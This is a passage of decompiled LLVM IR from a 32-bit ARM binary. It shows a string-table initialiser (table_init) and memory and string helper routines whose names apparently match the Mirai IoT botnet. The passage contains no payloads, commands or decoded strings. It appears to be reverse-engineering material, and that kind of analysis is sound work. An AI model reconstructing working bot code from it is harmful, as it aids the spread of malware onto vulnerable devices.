  br i1 %v8_fe30, label %dec_label_pc_fde4.dec_label_pc_fde4_crit_edge, label %dec_label_pc_fe34.loopexit

dec_label_pc_fde4.dec_label_pc_fde4_crit_edge:    ; preds = %dec_label_pc_fde4
  %v0_fdec.pre = load i32, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_fde4

dec_label_pc_fe34.loopexit:                       ; preds = %dec_label_pc_fde4
  %v2_fe34.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_fe34

dec_label_pc_fe34:                                ; preds = %dec_label_pc_fe34.loopexit, %entry
  %v2_fe34 = phi i32 [ %v2_fe34.pre, %dec_label_pc_fe34.loopexit ], [ %v3_fdc8, %entry ]
  store i32 %v2_fe34, i32* @r4, align 4
  ret i32 %v2_fdb0

; uselistorder directives
  uselistorder i32 %v1_fe28, { 1, 2, 0 }
  uselistorder i32 %v1_fdd8, { 1, 0 }
  uselistorder i32 %v2_fdb4, { 3, 0, 1, 2 }
  uselistorder i32 %v3_fdac, { 1, 0 }
}

define i32 @table_init(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v3_fe44 = load i32, i32* @r4, align 4
  %v6_fe44 = load i32, i32* @r5, align 4
  %v9_fe44 = load i32, i32* @r6, align 4
  %v12_fe44 = load i32, i32* @r7, align 4
  %v15_fe44 = load i32, i32* @r8, align 4
  %v21_fe44 = load i32, i32* @sl, align 4
  %v24_fe44 = load i32, i32* @fp, align 4
  store i32 2, i32* @r0, align 4
  %v0_fe50 = call i32 @malloc()
  store i32 ptrtoint (i32* @global_var_24748.215 to i32), i32* @r4, align 4
  store i32 2, i32* @r7, align 4
  %v4_fe68 = call i32 @util_memcpy(i32 %v0_fe50, i32 ptrtoint ([3 x i8]* @global_var_19320.223 to i32), i32 2)
  store i32 13, i32* @r0, align 4
  store i32 %v0_fe50, i32* @global_var_24750.224, align 4
  %v0_fe74 = load i32, i32* @r7, align 4
  %v1_fe74 = trunc i32 %v0_fe74 to i16
  store i16 %v1_fe74, i16* bitcast (i32* @global_var_24754.225 to i16*), align 4
  store i32 13, i32* @r5, align 4
  %v0_fe7c = call i32 @malloc()
  store i32 ptrtoint ([14 x i8]* @global_var_19324.227 to i32), i32* @r8, align 4
  %v0_fe84 = load i32, i32* @r5, align 4
  store i32 %v0_fe7c, i32* @r6, align 4
  %v4_fe90 = call i32 @util_memcpy(i32 %v0_fe7c, i32 ptrtoint ([14 x i8]* @global_var_19324.227 to i32), i32 %v0_fe84)
  %v0_fe94 = load i32, i32* @r5, align 4
  store i32 %v0_fe94, i32* @r0, align 4
  %v0_fe98 = load i32, i32* @r6, align 4
  store i32 %v0_fe98, i32* @global_var_24758.228, align 4
  %v1_fe9c = trunc i32 %v0_fe94 to i16
  store i16 %v1_fe9c, i16* bitcast (i32* @global_var_2475c.229 to i16*), align 4
  %v0_fea0 = call i32 @malloc()
  %v0_fea4 = load i32, i32* @r8, align 4
  %v0_fea8 = load i32, i32* @r5, align 4
  store i32 %v0_fea0, i32* @r6, align 4
  %v4_feb0 = call i32 @util_memcpy(i32 %v0_fea0, i32 %v0_fea4, i32 %v0_fea8)
  %v0_feb4 = load i32, i32* @r7, align 4
  store i32 %v0_feb4, i32* @r0, align 4
  %v0_feb8 = load i32, i32* @r6, align 4
  store i32 %v0_feb8, i32* @global_var_24760.230, align 4
  %v0_febc = load i32, i32* @r5, align 4
  %v1_febc = trunc i32 %v0_febc to i16
  store i16 %v1_febc, i16* bitcast (i32* @global_var_24764.231 to i16*), align 4
  %v0_fec0 = call i32 @malloc()
  %v0_fec4 = load i32, i32* @r7, align 4
  store i32 %v0_fec0, i32* @r5, align 4
  %v3_fed0 = call i32 @util_memcpy(i32 %v0_fec0, i32 ptrtoint (i32* @global_var_19334.233 to i32), i32 %v0_fec4)
  store i32 29, i32* @r0, align 4
  %v0_fed8 = load i32, i32* @r5, align 4
  store i32 %v0_fed8, i32* @global_var_24768.234, align 4
  %v0_fedc = load i32, i32* @r7, align 4
  %v1_fedc = trunc i32 %v0_fedc to i16
  store i16 %v1_fedc, i16* bitcast (i32* @global_var_2476c.235 to i16*), align 4
  %v0_fee0 = call i32 @malloc()
  store i32 %v0_fee0, i32* @r5, align 4
  %v3_fef0 = call i32 @util_memcpy(i32 %v0_fee0, i32 ptrtoint (i32* @global_var_194b4.237 to i32), i32 29)
  store i32 6, i32* @r0, align 4
  store i16 29, i16* bitcast (i32* @global_var_24774.238 to i16*), align 4
  %v0_ff00 = load i32, i32* @r5, align 4
  store i32 %v0_ff00, i32* @global_var_24770.239, align 4
  %v0_ff04 = call i32 @malloc()
  store i32 6, i32* @sb, align 4
  store i32 %v0_ff04, i32* @r5, align 4
  %v4_ff18 = call i32 @util_memcpy(i32 %v0_ff04, i32 ptrtoint ([7 x i8]* @global_var_19338.241 to i32), i32 6)
  store i32 7, i32* @r0, align 4
  store i32 7, i32* @r7, align 4
  %v0_ff24 = load i32, i32* @r5, align 4
  store i32 %v0_ff24, i32* @global_var_24778.242, align 4
  %v0_ff28 = load i32, i32* @sb, align 4
  %v1_ff28 = trunc i32 %v0_ff28 to i16
  store i16 %v1_ff28, i16* bitcast (i32* @global_var_2477c.243 to i16*), align 4
  %v0_ff2c = call i32 @malloc()
  %v0_ff30 = load i32, i32* @r7, align 4
  store i32 %v0_ff2c, i32* @r5, align 4
  %v4_ff3c = call i32 @util_memcpy(i32 %v0_ff2c, i32 ptrtoint ([8 x i8]* @global_var_19340.245 to i32), i32 %v0_ff30)
  %v0_ff40 = load i32, i32* @r7, align 4
  store i32 %v0_ff40, i32* @r0, align 4
  %v0_ff44 = load i32, i32* @r5, align 4
  store i32 %v0_ff44, i32* @global_var_24780.246, align 4
  %v1_ff48 = trunc i32 %v0_ff40 to i16
  store i16 %v1_ff48, i16* bitcast (i32* @global_var_24784.247 to i16*), align 4
  %v0_ff4c = call i32 @malloc()
  %v0_ff50 = load i32, i32* @r7, align 4
  store i32 %v0_ff4c, i32* @r5, align 4
  %v4_ff5c = call i32 @util_memcpy(i32 %v0_ff4c, i32 ptrtoint ([8 x i8]* @global_var_19348.249 to i32), i32 %v0_ff50)
  store i32 3, i32* @r0, align 4
  %v0_ff64 = load i32, i32* @r5, align 4
  store i32 %v0_ff64, i32* @global_var_24788.250, align 4
  %v0_ff68 = load i32, i32* @r7, align 4
  %v1_ff68 = trunc i32 %v0_ff68 to i16
  store i16 %v1_ff68, i16* bitcast (i32* @global_var_2478c.251 to i16*), align 4
  %v0_ff6c = call i32 @malloc()
  store i32 %v0_ff6c, i32* @r5, align 4
  %v4_ff7c = call i32 @util_memcpy(i32 %v0_ff6c, i32 ptrtoint ([4 x i8]* @global_var_19350.253 to i32), i32 3)
  store i32 19, i32* @r0, align 4
  store i16 3, i16* bitcast (i32* @global_var_24794.254 to i16*), align 4
  %v0_ff8c = load i32, i32* @r5, align 4
  store i32 %v0_ff8c, i32* @global_var_24790.255, align 4
  %v0_ff90 = call i32 @malloc()
  store i32 %v0_ff90, i32* @r5, align 4
  %v3_ffa0 = call i32 @util_memcpy(i32 %v0_ff90, i32 ptrtoint (i32* @global_var_19354.257 to i32), i32 19)
  store i32 24, i32* @r0, align 4
  store i16 19, i16* bitcast (i32* @global_var_2479c.258 to i16*), align 4
  %v0_ffb0 = load i32, i32* @r5, align 4
  store i32 %v0_ffb0, i32* @global_var_24798.259, align 4
  %v0_ffb4 = call i32 @malloc()
  store i32 %v0_ffb4, i32* @r5, align 4
  %v3_ffc4 = call i32 @util_memcpy(i32 %v0_ffb4, i32 ptrtoint (i32* @global_var_19368.261 to i32), i32 24)
  store i32 9, i32* @r0, align 4
  store i16 24, i16* bitcast (i32* @global_var_247a4.262 to i16*), align 4
  %v0_ffd4 = load i32, i32* @r5, align 4
  store i32 %v0_ffd4, i32* @global_var_247a0.263, align 4
  %v0_ffd8 = call i32 @malloc()
  store i32 %v0_ffd8, i32* @r5, align 4
  %v4_ffe8 = call i32 @util_memcpy(i32 %v0_ffd8, i32 ptrtoint ([10 x i8]* @global_var_19384.265 to i32), i32 9)
  store i32 16, i32* @r0, align 4
  store i16 9, i16* bitcast (i32* @global_var_247ac.266 to i16*), align 4
  %v0_fff8 = load i32, i32* @r5, align 4
  store i32 %v0_fff8, i32* @global_var_247a8.267, align 4
  %v0_fffc = call i32 @malloc()
  store i32 16, i32* @sl, align 4
  store i32 %v0_fffc, i32* @r5, align 4
  %v4_10010 = call i32 @util_memcpy(i32 %v0_fffc, i32 ptrtoint ([17 x i8]* @global_var_19390.269 to i32), i32 16)
  store i32 22, i32* @r0, align 4
  %v0_10018 = load i32, i32* @r5, align 4
  store i32 %v0_10018, i32* @global_var_247b0.270, align 4
  %v0_1001c = load i32, i32* @sl, align 4
  %v1_1001c = trunc i32 %v0_1001c to i16
  store i16 %v1_1001c, i16* bitcast (i32* @global_var_247b4.271 to i16*), align 4
  %v0_10020 = call i32 @malloc()
  store i32 %v0_10020, i32* @r5, align 4
  %v4_10030 = call i32 @util_memcpy(i32 %v0_10020, i32 ptrtoint ([23 x i8]* @global_var_193a4.273 to i32), i32 22)
  %v0_10038 = load i32, i32* @r7, align 4
  store i32 %v0_10038, i32* @r0, align 4
  store i16 22, i16* bitcast (i32* @global_var_247bc.274 to i16*), align 4
  %v0_10040 = load i32, i32* @r5, align 4
  store i32 %v0_10040, i32* @global_var_247b8.275, align 4
  %v0_10044 = call i32 @malloc()
  %v0_10048 = load i32, i32* @r7, align 4
  store i32 %v0_10044, i32* @r5, align 4
  %v4_10054 = call i32 @util_memcpy(i32 %v0_10044, i32 ptrtoint ([8 x i8]* @global_var_193bc.277 to i32), i32 %v0_10048)
  store i32 5, i32* @r0, align 4
  %v0_1005c = load i32, i32* @r5, align 4
  store i32 %v0_1005c, i32* @global_var_247c0.278, align 4
  %v0_10060 = load i32, i32* @r7, align 4
  %v1_10060 = trunc i32 %v0_10060 to i16
  store i16 %v1_10060, i16* bitcast (i32* @global_var_247c4.279 to i16*), align 4
  %v0_10064 = call i32 @malloc()
  store i32 %v0_10064, i32* @r5, align 4
  store i32 5, i32* @fp, align 4
  %v4_10078 = call i32 @util_memcpy(i32 %v0_10064, i32 ptrtoint ([6 x i8]* @global_var_193c4.281 to i32), i32 5)
  store i32 4, i32* @r0, align 4
  %v0_10080 = load i32, i32* @r5, align 4
  store i32 %v0_10080, i32* @global_var_247c8.282, align 4
  %v0_10084 = load i32, i32* @fp, align 4
  %v1_10084 = trunc i32 %v0_10084 to i16
  store i16 %v1_10084, i16* bitcast (i32* @global_var_247cc.283 to i16*), align 4
  %v0_10088 = call i32 @malloc()
  store i32 %v0_10088, i32* @r5, align 4
  %v4_10098 = call i32 @util_memcpy(i32 %v0_10088, i32 ptrtoint ([5 x i8]* @global_var_193cc.285 to i32), i32 4)
  %v0_100a0 = load i32, i32* @sb, align 4
  store i32 %v0_100a0, i32* @r0, align 4
  store i16 4, i16* bitcast (i32* @global_var_247d4.286 to i16*), align 4
  %v0_100a8 = load i32, i32* @r5, align 4
  store i32 %v0_100a8, i32* @global_var_247d0.287, align 4
  %v0_100ac = call i32 @malloc()
  %v0_100b4 = load i32, i32* @sb, align 4
  store i32 %v0_100ac, i32* @r5, align 4
  %v4_100bc = call i32 @util_memcpy(i32 %v0_100ac, i32 ptrtoint ([7 x i8]* @global_var_193d4.289 to i32), i32 %v0_100b4)
  store i32 14, i32* @r0, align 4
  %v0_100c4 = load i32, i32* @r5, align 4
  store i32 %v0_100c4, i32* @global_var_247d8.290, align 4
  %v0_100c8 = load i32, i32* @sb, align 4
  %v1_100c8 = trunc i32 %v0_100c8 to i16
  store i16 %v1_100c8, i16* bitcast (i32* @global_var_247dc.291 to i16*), align 4
  %v0_100cc = call i32 @malloc()
  store i32 %v0_100cc, i32* @r5, align 4
  store i32 14, i32* @r8, align 4
  %v4_100e0 = call i32 @util_memcpy(i32 %v0_100cc, i32 ptrtoint ([15 x i8]* @global_var_193dc.293 to i32), i32 14)
  store i32 8, i32* @r0, align 4
  %v0_100e8 = load i32, i32* @r5, align 4
  store i32 %v0_100e8, i32* @global_var_247e0.294, align 4
  %v0_100ec = load i32, i32* @r8, align 4
  %v1_100ec = trunc i32 %v0_100ec to i16
  store i16 %v1_100ec, i16* bitcast (i32* @global_var_247e4.295 to i16*), align 4
  %v0_100f0 = call i32 @malloc()
  store i32 8, i32* @r6, align 4
  store i32 %v0_100f0, i32* @r5, align 4
  %v4_10104 = call i32 @util_memcpy(i32 %v0_100f0, i32 ptrtoint ([9 x i8]* @global_var_193ec.297 to i32), i32 8)
  %v0_1010c = load i32, i32* @r7, align 4
  store i32 %v0_1010c, i32* @r0, align 4
  %v0_10110 = load i32, i32* @r6, align 4
  %v1_10110 = trunc i32 %v0_10110 to i16
  %v2_10110 = load i32, i32* @r4, align 4
  %v4_10110 = add i32 %v2_10110, 260
  %v5_10110 = inttoptr i32 %v4_10110 to i16*
  store i16 %v1_10110, i16* %v5_10110, align 2
  %v0_10114 = load i32, i32* @r5, align 4
  store i32 %v0_10114, i32* @global_var_24848.298, align 4
  %v0_10118 = call i32 @malloc()
  %v0_1011c = load i32, i32* @r7, align 4
  store i32 %v0_10118, i32* @r5, align 4
  %v4_10128 = call i32 @util_memcpy(i32 %v0_10118, i32 ptrtoint ([8 x i8]* @global_var_193f8.300 to i32), i32 %v0_1011c)
  %v0_10130 = load i32, i32* @sl, align 4
  store i32 %v0_10130, i32* @r0, align 4
  %v0_10134 = load i32, i32* @r7, align 4
  %v1_10134 = trunc i32 %v0_10134 to i16
  %v2_10134 = load i32, i32* @r4, align 4
  %v4_10134 = add i32 %v2_10134, 268
  %v5_10134 = inttoptr i32 %v4_10134 to i16*
  store i16 %v1_10134, i16* %v5_10134, align 2
  %v0_10138 = load i32, i32* @r5, align 4
  store i32 %v0_10138, i32* @global_var_24850.301, align 4
  %v0_1013c = call i32 @malloc()
  %v0_10144 = load i32, i32* @sl, align 4
  store i32 %v0_1013c, i32* @r5, align 4
  %v4_1014c = call i32 @util_memcpy(i32 %v0_1013c, i32 ptrtoint ([17 x i8]* @global_var_19400.303 to i32), i32 %v0_10144)
  store i32 23, i32* @r0, align 4
  %v0_10154 = load i32, i32* @r5, align 4
  store i32 %v0_10154, i32* @global_var_247e8.304, align 4
  %v0_10158 = load i32, i32* @sl, align 4
  %v1_10158 = trunc i32 %v0_10158 to i16
  store i16 %v1_10158, i16* bitcast (i32* @global_var_247ec.305 to i16*), align 4
  %v0_1015c = call i32 @malloc()
  store i32 %v0_1015c, i32* @r5, align 4
  %v0_1016c = load i32, i32* @r7, align 4
  %v1_1016c = load i32, i32* @sl, align 4
  %v2_1016c = add i32 %v1_1016c, %v0_1016c
  store i32 %v2_1016c, i32* @r7, align 4
  %v4_10170 = call i32 @util_memcpy(i32 %v0_1015c, i32 ptrtoint ([24 x i8]* @global_var_19414.307 to i32), i32 23)
  %v0_10174 = load i32, i32* @r6, align 4
  store i32 %v0_10174, i32* @r0, align 4
  %v0_10178 = load i32, i32* @r5, align 4
  store i32 %v0_10178, i32* @global_var_247f0.308, align 4
  %v0_1017c = load i32, i32* @r7, align 4
  %v1_1017c = trunc i32 %v0_1017c to i16
  store i16 %v1_1017c, i16* bitcast (i32* @global_var_247f4.309 to i16*), align 4
  %v0_10180 = call i32 @malloc()
  %v0_10188 = load i32, i32* @r6, align 4
  store i32 %v0_10180, i32* @r5, align 4
  %v4_10190 = call i32 @util_memcpy(i32 %v0_10180, i32 ptrtoint ([9 x i8]* @global_var_1942c.311 to i32), i32 %v0_10188)
  store i32 21, i32* @r0, align 4
  %v0_10198 = load i32, i32* @r5, align 4
  store i32 %v0_10198, i32* @global_var_247f8.312, align 4
  %v0_1019c = load i32, i32* @r6, align 4
  %v1_1019c = trunc i32 %v0_1019c to i16
  store i16 %v1_1019c, i16* bitcast (i32* @global_var_247fc.313 to i16*), align 4
  %v0_101a0 = call i32 @malloc()
  store i32 %v0_101a0, i32* @r5, align 4
  %v3_101b0 = call i32 @util_memcpy(i32 %v0_101a0, i32 ptrtoint (i32* @global_var_194d4.315 to i32), i32 21)
  store i32 17, i32* @r0, align 4
  store i16 21, i16* bitcast (i32* @global_var_24804.316 to i16*), align 4
  %v0_101c0 = load i32, i32* @r5, align 4
  store i32 %v0_101c0, i32* @global_var_24800.317, align 4
  %v0_101c4 = call i32 @malloc()
  store i32 %v0_101c4, i32* @r5, align 4
  %v4_101d4 = call i32 @util_memcpy(i32 %v0_101c4, i32 ptrtoint ([18 x i8]* @global_var_19438.319 to i32), i32 17)
  store i32 12, i32* @r0, align 4
  store i16 17, i16* bitcast (i32* @global_var_2480c.320 to i16*), align 4
  %v0_101e4 = load i32, i32* @r5, align 4
  store i32 %v0_101e4, i32* @global_var_24808.321, align 4
  %v0_101e8 = call i32 @malloc()
  store i32 %v0_101e8, i32* @r5, align 4
  %v4_101f8 = call i32 @util_memcpy(i32 %v0_101e8, i32 ptrtoint ([13 x i8]* @global_var_1944c.323 to i32), i32 12)
  %v0_10200 = load i32, i32* @r8, align 4
  store i32 %v0_10200, i32* @r0, align 4
  store i16 12, i16* bitcast (i32* @global_var_24814.324 to i16*), align 4
  %v0_10208 = load i32, i32* @r5, align 4
  store i32 %v0_10208, i32* @global_var_24810.325, align 4
  %v0_1020c = call i32 @malloc()
  %v0_10214 = load i32, i32* @r8, align 4
  store i32 %v0_1020c, i32* @r5, align 4
  %v4_1021c = call i32 @util_memcpy(i32 %v0_1020c, i32 ptrtoint ([15 x i8]* @global_var_1945c.327 to i32), i32 %v0_10214)
  store i32 19, i32* @r0, align 4
  %v0_10224 = load i32, i32* @r5, align 4
  store i32 %v0_10224, i32* @global_var_24818.328, align 4
  %v0_10228 = load i32, i32* @r8, align 4
  %v1_10228 = trunc i32 %v0_10228 to i16
  store i16 %v1_10228, i16* bitcast (i32* @global_var_2481c.329 to i16*), align 4
  %v0_1022c = call i32 @malloc()
  store i32 %v0_1022c, i32* @r5, align 4
  %v4_1023c = call i32 @util_memcpy(i32 %v0_1022c, i32 ptrtoint ([20 x i8]* @global_var_1946c.331 to i32), i32 19)
  %v0_10244 = load i32, i32* @r6, align 4
  store i32 %v0_10244, i32* @r0, align 4
  store i16 19, i16* bitcast (i32* @global_var_24824.332 to i16*), align 4
  %v0_1024c = load i32, i32* @r5, align 4
  store i32 %v0_1024c, i32* @global_var_24820.333, align 4
  %v0_10250 = call i32 @malloc()
  %v0_10258 = load i32, i32* @r6, align 4
  store i32 %v0_10250, i32* @r5, align 4
  %v4_10260 = call i32 @util_memcpy(i32 %v0_10250, i32 ptrtoint ([9 x i8]* @global_var_19480.335 to i32), i32 %v0_10258)
  %v0_10264 = load i32, i32* @fp, align 4
  store i32 %v0_10264, i32* @r0, align 4
  %v0_10268 = load i32, i32* @r5, align 4
  store i32 %v0_10268, i32* @global_var_24828.336, align 4
  %v0_1026c = load i32, i32* @r6, align 4
  %v1_1026c = trunc i32 %v0_1026c to i16
  store i16 %v1_1026c, i16* bitcast (i32* @global_var_2482c.337 to i16*), align 4
  %v0_10270 = call i32 @malloc()
  %v0_10278 = load i32, i32* @fp, align 4
  store i32 %v0_10270, i32* @r5, align 4
  %v4_10280 = call i32 @util_memcpy(i32 %v0_10270, i32 ptrtoint ([6 x i8]* @global_var_1948c.339 to i32), i32 %v0_10278)
  %v0_10284 = load i32, i32* @sb, align 4
  store i32 %v0_10284, i32* @r0, align 4
  %v0_10288 = load i32, i32* @r5, align 4
  store i32 %v0_10288, i32* @global_var_24830.340, align 4
  %v0_1028c = load i32, i32* @fp, align 4
  %v1_1028c = trunc i32 %v0_1028c to i16
  store i16 %v1_1028c, i16* bitcast (i32* @global_var_24834.341 to i16*), align 4
  %v0_10290 = call i32 @malloc()
  %v0_10298 = load i32, i32* @sb, align 4
  store i32 %v0_10290, i32* @r5, align 4
  %v4_102a0 = call i32 @util_memcpy(i32 %v0_10290, i32 ptrtoint ([7 x i8]* @global_var_19494.343 to i32), i32 %v0_10298)
  %v0_102a4 = load i32, i32* @r7, align 4
  store i32 %v0_102a4, i32* @r0, align 4
  %v0_102a8 = load i32, i32* @r5, align 4
  store i32 %v0_102a8, i32* @global_var_24838.344, align 4
  %v0_102ac = load i32, i32* @sb, align 4
  %v1_102ac = trunc i32 %v0_102ac to i16
  store i16 %v1_102ac, i16* bitcast (i32* @global_var_2483c.345 to i16*), align 4
  %v0_102b0 = call i32 @malloc()
  %v0_102b8 = load i32, i32* @r7, align 4
  %v4_102c0 = call i32 @util_memcpy(i32 %v0_102b0, i32 ptrtoint ([24 x i8]* @global_var_1949c.347 to i32), i32 %v0_102b8)
  %v0_102c4 = load i32, i32* @r7, align 4
  %v1_102c4 = trunc i32 %v0_102c4 to i16
  store i16 %v1_102c4, i16* bitcast (i32* @global_var_24844.348 to i16*), align 4
  store i32 %v0_102b0, i32* @global_var_24840.349, align 4
  store i32 %v3_fe44, i32* @r4, align 4
  store i32 %v6_fe44, i32* @r5, align 4
  store i32 %v9_fe44, i32* @r6, align 4
  store i32 %v12_fe44, i32* @r7, align 4
  store i32 %v15_fe44, i32* @r8, align 4
  store i32 %v21_fe44, i32* @sl, align 4
  store i32 %v24_fe44, i32* @fp, align 4
  ret i32 %v4_102c0

; uselistorder directives
  uselistorder i32 %v0_10290, { 1, 0 }
  uselistorder i32 %v0_10270, { 1, 0 }
  uselistorder i32 %v0_10250, { 1, 0 }
  uselistorder i32 %v0_1020c, { 1, 0 }
  uselistorder i32 %v0_10180, { 1, 0 }
  uselistorder i32 %v0_1013c, { 1, 0 }
  uselistorder i32 %v0_10118, { 1, 0 }
  uselistorder i32 %v0_100f0, { 1, 0 }
  uselistorder i32 %v0_100ac, { 1, 0 }
  uselistorder i32 %v0_10044, { 1, 0 }
  uselistorder i32 %v0_fffc, { 1, 0 }
  uselistorder i32 %v0_ff4c, { 1, 0 }
  uselistorder i32 %v0_ff2c, { 1, 0 }
  uselistorder i32 %v0_ff04, { 1, 0 }
  uselistorder i32 %v0_fec0, { 1, 0 }
  uselistorder i32 %v0_fea0, { 1, 0 }
  uselistorder i32 %v0_fe7c, { 1, 0 }
  uselistorder i32 23, { 0, 3, 1, 2 }
  uselistorder i32 29, { 0, 12, 1, 7, 5, 8, 2, 9, 3, 10, 4, 11, 13, 6 }
  uselistorder i32 (i32, i32, i32)* @util_memcpy, { 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_24748.215 to i32), { 4, 0, 1, 2, 3, 5 }
}

define i32 @util_strlen(i8* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v3_10360 = load i8, i8* %arg1, align 1
  %v2_10364 = icmp eq i8 %v3_10360, 0
  %v0_10368 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_10364, i32 %v0_10368)
  br label %dec_label_pc_10370

dec_label_pc_10370:                               ; preds = %dec_label_pc_10370, %entry
  %v0_10370 = phi i32 [ %v1_10370, %dec_label_pc_10370 ], [ 0, %entry ]
  %v1_10370 = add i32 %v0_10370, 1
  %v2_10374 = add i32 %v1_10370, %tmp
  %v3_10374 = inttoptr i32 %v2_10374 to i8*
  %v4_10374 = load i8, i8* %v3_10374, align 1
  %v6_10374 = zext i8 %v4_10374 to i32
  store i32 %v6_10374, i32* @r3, align 4
  %v2_10378 = icmp eq i8 %v4_10374, 0
  br i1 %v2_10378, label %dec_label_pc_10380, label %dec_label_pc_10370

dec_label_pc_10380:                               ; preds = %dec_label_pc_10370
  ret i32 %v1_10370
}

define i32 @util_strcpy(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* @r1, align 4
  %v2_10384 = load i8, i8* %arg1, align 1
  %v3_10384 = zext i8 %v2_10384 to i32
  store i32 %v3_10384, i32* @r2, align 4
  %v2_10388 = icmp eq i8 %v2_10384, 0
  br i1 %v2_10388, label %bb, label %dec_label_pc_10394

bb:                                               ; preds = %entry
  store i32 %v3_10384, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_103a8

dec_label_pc_10394:                               ; preds = %entry
  store i32 0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_10398

dec_label_pc_10398:                               ; preds = %dec_label_pc_10398, %dec_label_pc_10394
  %v0_10398 = phi i32 [ %v1_10398, %dec_label_pc_10398 ], [ 0, %dec_label_pc_10394 ]
  %v1_10398 = add i32 %v0_10398, 1
  store i32 %v1_10398, i32* %ip.global-to-local, align 4
  %v2_1039c = add i32 %v1_10398, %tmp
  %v3_1039c = inttoptr i32 %v2_1039c to i8*
  %v4_1039c = load i8, i8* %v3_1039c, align 1
  %v2_103a0 = icmp eq i8 %v4_1039c, 0
  br i1 %v2_103a0, label %dec_label_pc_103a8, label %dec_label_pc_10398

dec_label_pc_103a8:                               ; preds = %dec_label_pc_10398, %bb
  %v0_103a8 = phi i32 [ %v3_10384, %bb ], [ %v1_10398, %dec_label_pc_10398 ]
  br label %dec_label_pc_103b4

dec_label_pc_103b0:                               ; preds = %dec_label_pc_103b4
  %v0_103b0 = load i32, i32* @r1, align 4
  %v1_103b0 = add i32 %v0_103b0, 1
  %v2_103b0 = inttoptr i32 %v1_103b0 to i8*
  %v3_103b0 = load i8, i8* %v2_103b0, align 1
  %v4_103b0 = zext i8 %v3_103b0 to i32
  store i32 %v4_103b0, i32* @r2, align 4
  store i32 %v1_103b0, i32* @r1, align 4
  %v0_103b4.pr = load i32, i32* @r3, align 4
  br label %dec_label_pc_103b4

dec_label_pc_103b4:                               ; preds = %dec_label_pc_103a8, %dec_label_pc_103b0
  %v0_103bc.off0 = phi i8 [ %v2_10384, %dec_label_pc_103a8 ], [ %v3_103b0, %dec_label_pc_103b0 ]
  %v0_103b4 = phi i32 [ %v0_103a8, %dec_label_pc_103a8 ], [ %v0_103b4.pr, %dec_label_pc_103b0 ]
  %v1_103b4 = add i32 %v0_103b4, -1
  store i32 %v1_103b4, i32* @r3, align 4
  %v3_103b8 = icmp eq i32 %v0_103b4, 0
  %v2_103bc = load i32, i32* @r0, align 4
  %v3_103bc = inttoptr i32 %v2_103bc to i8*
  store i8 %v0_103bc.off0, i8* %v3_103bc, align 1
  %v4_103bc = load i32, i32* @r0, align 4
  %v5_103bc = add i32 %v4_103bc, 1
  store i32 %v5_103bc, i32* @r0, align 4
  br i1 %v3_103b8, label %dec_label_pc_103c4, label %dec_label_pc_103b0

dec_label_pc_103c4:                               ; preds = %dec_label_pc_103b4
  %v0_103c4 = load i32, i32* %ip.global-to-local, align 4
  ret i32 %v0_103c4

; uselistorder directives
  uselistorder i32 %v0_103b4, { 1, 0 }
  uselistorder i32 %v1_10398, { 0, 1, 3, 2 }
  uselistorder i32* %ip.global-to-local, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_103b4, { 1, 0 }
}

define i32 @util_memcpy(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %v2_103cc = icmp eq i32 %arg3, 0
  %v0_103d0 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_103cc, i32 %v0_103d0)
  store i32 0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_103d8

dec_label_pc_103d8:                               ; preds = %dec_label_pc_103d8, %entry
  %v0_103d8 = phi i32 [ %v1_103e0, %dec_label_pc_103d8 ], [ 0, %entry ]
  %v2_103d8 = add i32 %v0_103d8, %arg2
  %v3_103d8 = inttoptr i32 %v2_103d8 to i8*
  %v4_103d8 = load i8, i8* %v3_103d8, align 1
  %v4_103dc = add i32 %v0_103d8, %arg1
  %v5_103dc = inttoptr i32 %v4_103dc to i8*
  store i8 %v4_103d8, i8* %v5_103dc, align 1
  %v0_103e0 = load i32, i32* %ip.global-to-local, align 4
  %v1_103e0 = add i32 %v0_103e0, 1
  store i32 %v1_103e0, i32* %ip.global-to-local, align 4
  %v9_103e4 = icmp eq i32 %v1_103e0, %arg3
  br i1 %v9_103e4, label %dec_label_pc_103ec, label %dec_label_pc_103d8

dec_label_pc_103ec:                               ; preds = %dec_label_pc_103d8
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %v1_103e0, { 1, 2, 0 }
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @util_zero() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %v0_103f0 = load i32, i32* @r1, align 4
  %v2_103f0 = icmp eq i32 %v0_103f0, 0
  %v0_103f4 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_103f0, i32 %v0_103f4)
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_103fc

dec_label_pc_103fc:                               ; preds = %dec_label_pc_103fc, %entry
  %v2_10400 = phi i32 [ %v1_10404, %dec_label_pc_103fc ], [ 0, %entry ]
  store i32 0, i32* @r3, align 4
  %v3_10400 = load i32, i32* @r0, align 4
  %v4_10400 = add i32 %v3_10400, %v2_10400
  %v5_10400 = inttoptr i32 %v4_10400 to i8*
  store i8 0, i8* %v5_10400, align 1
  %v0_10404 = load i32, i32* %r2.global-to-local, align 4
  %v1_10404 = add i32 %v0_10404, 1
  store i32 %v1_10404, i32* %r2.global-to-local, align 4
  %v1_10408 = load i32, i32* @r1, align 4
  %v9_10408 = icmp eq i32 %v1_10404, %v1_10408
  br i1 %v9_10408, label %dec_label_pc_10410, label %dec_label_pc_103fc

